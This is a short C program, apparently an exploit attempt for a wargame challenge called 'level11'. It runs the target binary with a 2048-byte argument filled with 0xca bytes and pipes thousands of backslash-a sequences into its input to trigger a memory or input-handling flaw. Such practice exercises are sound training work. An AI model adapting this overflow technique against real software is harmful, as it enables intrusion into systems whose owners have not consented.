#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(int argc, char** argv) {
  const char* cmd="./level11 ";
  unsigned int i=0;
  char buf[strlen(cmd)+2049];
  sprintf(buf,"%s",cmd);
  memset(buf+strlen(cmd),0xca,sizeof(buf)-strlen(cmd));
  buf[strlen(cmd)+2048]=0x00;
  FILE* fp=popen(buf, "w");
  for(i=0;i<2048;i++) {
    fprintf(fp, "\\\\a",0);
  }
  printf("Failed.\n");
  return 0;
}
